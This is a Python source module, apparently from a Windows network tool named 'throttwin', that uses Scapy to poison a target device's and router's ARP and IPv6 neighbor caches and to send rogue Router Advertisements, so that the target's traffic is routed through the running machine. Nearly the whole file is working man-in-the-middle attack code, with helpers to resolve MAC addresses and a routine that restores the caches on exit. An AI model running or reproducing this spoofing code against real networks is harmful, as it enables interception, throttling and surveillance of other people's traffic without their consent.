import time
import logging
import threading

log = logging.getLogger("throttwin")


def arp_spoof_loop(interface, target_ip, target_mac, router_ip, router_mac,
                   my_mac, stop_event, status=None):
    """
    Continuously send forged ARP replies and ICMPv6 NDP/RA spoofing packets:
      - IPv4: ARP-poisons target device and router so IPv4 traffic is captured.
      - IPv6: Transmits unicast ICMPv6 Router Advertisements with routerlifetime=0 & prefixlifetime=0
        originating from the router's link-local address, plus ICMPv6 Neighbor Advertisements (NA)
        with Override=1 to poison IPv6 neighbor caches on dual-stack devices (iPhone/iOS, Android).
    Uses Scapy on Windows via Npcap.
    """
    from .network import get_all_local_ips_and_macs
    all_ips, all_macs = get_all_local_ips_and_macs()
    target_mac_clean = (target_mac or "").lower().replace("-", ":")
    router_mac_clean = (router_mac or "").lower().replace("-", ":")
    my_mac_clean = (my_mac or "").lower().replace("-", ":")

    if (
        not target_ip
        or target_ip in ("-", "0.0.0.0", "127.0.0.1", router_ip)
        or target_ip in all_ips
        or target_mac_clean in all_macs
        or target_mac_clean in (router_mac_clean, my_mac_clean)
    ):
        log.warning(f"Aborting arp_spoof_loop: target {target_ip} ({target_mac}) is self or gateway.")
        return

    try:
        from scapy.all import Ether, ARP, sendp, conf as scapy_conf
        from scapy.layers.inet6 import IPv6, ICMPv6ND_RA, ICMPv6NDOptSrcLLAddr, ICMPv6NDOptPrefixInfo, ICMPv6ND_NA, ICMPv6NDOptDstLLAddr
        from .network import get_scapy_interface, get_interface_ipv6_link_local, get_interface_ipv6_prefixes, mac_to_ipv6_ll
        npf_iface = get_scapy_interface(interface)
        my_ll_ipv6 = get_interface_ipv6_link_local(interface)
        router_ipv6_ll = mac_to_ipv6_ll(router_mac)
        target_ipv6_ll = mac_to_ipv6_ll(target_mac)

        # ── 1. IPv4 ARP Poisoning Packets ──────────────────────────────────────────
        # Packet: tell target "I am the router" (IPv4)
        pkt_to_target = (
            Ether(dst=target_mac, src=my_mac) /
            ARP(op=2, pdst=target_ip, hwdst=target_mac,
                psrc=router_ip, hwsrc=my_mac)
        )
        # Packet: tell router "I am the target" (IPv4)
        pkt_to_router = (
            Ether(dst=router_mac, src=my_mac) /
            ARP(op=2, pdst=router_ip, hwdst=router_mac,
                psrc=target_ip, hwsrc=my_mac)
        )

        # ── 2. IPv6 NDP Neighbor Advertisement (NA) Poisoning Packets ──────────────
        # Tell Target: router's link-local IPv6 is at my_mac (R=1 Router, O=1 Override)
        pkt_na_to_target = (
            Ether(dst=target_mac, src=my_mac) /
            IPv6(src=router_ipv6_ll, dst="ff02::1") /
            ICMPv6ND_NA(R=1, S=0, O=1, tgt=router_ipv6_ll) /
            ICMPv6NDOptDstLLAddr(lladdr=my_mac)
        )
        # Tell Router: target's link-local IPv6 is at my_mac (R=0 Host, O=1 Override)
        pkt_na_to_router = (
            Ether(dst=router_mac, src=my_mac) /
            IPv6(src=target_ipv6_ll, dst="ff02::1") /
            ICMPv6ND_NA(R=0, S=0, O=1, tgt=target_ipv6_ll) /
            ICMPv6NDOptDstLLAddr(lladdr=my_mac)
        )

        # ── 3. IPv6 Rogue RA Deprecation Packets (Strictly Unicast to Target) ──────
        # Sourced from the router's real link-local address with routerlifetime=0
        ra_base = (
            IPv6(src=router_ipv6_ll, dst="ff02::1") /
            ICMPv6ND_RA(routerlifetime=0, chlim=64, prf=3) /
            ICMPv6NDOptSrcLLAddr(lladdr=my_mac)
        )

        # Append Prefix Information Options for all detected local SLAAC prefixes with validlifetime=0
        for p_str, p_len in get_interface_ipv6_prefixes(interface):
            ra_base = ra_base / ICMPv6NDOptPrefixInfo(
                prefix=p_str,
                prefixlen=p_len,
                L=1,
                A=1,
                validlifetime=0,
                preferredlifetime=0
            )

        pkt_ra_unicast = Ether(dst=target_mac, src=my_mac) / ra_base

        log.info(f"Dual-stack spoof started: {target_ip} ({target_mac})")

        while not stop_event.is_set():
            try:
                # Send IPv4 ARP poison
                sendp(pkt_to_target, iface=npf_iface, verbose=0)
                sendp(pkt_to_router, iface=npf_iface, verbose=0)
                # Send IPv6 NDP NA poison (unicast frames to target & router)
                sendp(pkt_na_to_target, iface=npf_iface, verbose=0)
                sendp(pkt_na_to_router, iface=npf_iface, verbose=0)
                # Send IPv6 SLAAC/RA deprecation (unicast frame to target only)
                sendp(pkt_ra_unicast, iface=npf_iface, verbose=0)
            except Exception as e:
                log.debug(f"Spoof send error for {target_ip} (interface may be reconnecting): {e}")
                npf_iface = get_scapy_interface(interface)
            stop_event.wait(1.0)

    except Exception as e:
        log.debug(f"Dual-stack spoof loop exception for {target_ip}: {e}")
    finally:
        # Restore ARP and NDP tables on exit
        _restore_arp(interface, target_ip, target_mac, router_ip, router_mac, my_mac)
        log.info(f"Dual-stack spoof stopped and restored: {target_ip}")


def _restore_arp(interface, target_ip, target_mac, router_ip, router_mac, my_mac):
    """Send gratuitous ARP and NDP replies to restore correct MAC mappings."""
    try:
        from scapy.all import Ether, ARP, sendp
        from scapy.layers.inet6 import IPv6, ICMPv6ND_NA, ICMPv6NDOptDstLLAddr
        from .network import get_scapy_interface, mac_to_ipv6_ll
        npf_iface = get_scapy_interface(interface)
        router_ipv6_ll = mac_to_ipv6_ll(router_mac)
        target_ipv6_ll = mac_to_ipv6_ll(target_mac)

        # Tell target: router's real MAC (IPv4)
        restore_target = (
            Ether(dst=target_mac, src=router_mac) /
            ARP(op=2, pdst=target_ip, hwdst=target_mac,
                psrc=router_ip, hwsrc=router_mac)
        )
        # Tell router: target's real MAC (IPv4)
        restore_router = (
            Ether(dst=router_mac, src=target_mac) /
            ARP(op=2, pdst=router_ip, hwdst=router_mac,
                psrc=target_ip, hwsrc=target_mac)
        )

        # Tell target: router's real MAC (IPv6)
        restore_na_target = (
            Ether(dst=target_mac, src=router_mac) /
            IPv6(src=router_ipv6_ll, dst="ff02::1") /
            ICMPv6ND_NA(R=1, S=0, O=1, tgt=router_ipv6_ll) /
            ICMPv6NDOptDstLLAddr(lladdr=router_mac)
        )
        # Tell router: target's real MAC (IPv6)
        restore_na_router = (
            Ether(dst=router_mac, src=target_mac) /
            IPv6(src=target_ipv6_ll, dst="ff02::1") /
            ICMPv6ND_NA(R=0, S=0, O=1, tgt=target_ipv6_ll) /
            ICMPv6NDOptDstLLAddr(lladdr=target_mac)
        )

        for _ in range(4):
            sendp(restore_target, iface=npf_iface, verbose=0)
            sendp(restore_router, iface=npf_iface, verbose=0)
            sendp(restore_na_target, iface=npf_iface, verbose=0)
            sendp(restore_na_router, iface=npf_iface, verbose=0)
            time.sleep(0.15)

    except Exception as e:
        log.warning(f"ARP restore failed for {target_ip}: {e}")


def get_router_mac(router_ip, interface):
    """
    Resolve the router's MAC address via native Win32 SendARP, ARP cache, or Scapy.
    """
    from .network import win_send_arp, resolve_mac_from_arp_cache, get_scapy_interface, get_interface_ip_and_mac

    src_ip = None
    if interface:
        src_ip, _ = get_interface_ip_and_mac(interface)

    # 1. Native Win32 SendARP
    mac = win_send_arp(router_ip, src_ip=src_ip)
    if mac and mac not in ("00:00:00:00:00:00", "ff:ff:ff:ff:ff:ff"):
        return mac

    # 2. Windows ARP Cache
    mac = resolve_mac_from_arp_cache(router_ip, interface_ip=src_ip)
    if mac:
        return mac

    # 3. Scapy ARP Request
    try:
        from scapy.all import Ether, ARP, srp
        npf_iface = get_scapy_interface(interface)
        ans, _ = srp(
            Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=router_ip),
            iface=npf_iface, timeout=1.5, verbose=0, retry=1
        )
        if ans:
            return ans[0][1][Ether].src.lower()
    except Exception as e:
        log.warning(f"Could not resolve router MAC for {router_ip}: {e}")
    return None


def get_my_mac(interface):
    """Get this machine's MAC address for the given interface."""
    from .network import get_interface_ip_and_mac
    _, mac = get_interface_ip_and_mac(interface)
    if mac:
        return mac

    try:
        from scapy.all import get_if_hwaddr
        from .network import get_scapy_interface
        return get_if_hwaddr(get_scapy_interface(interface)).lower()
    except Exception:
        pass
    return None
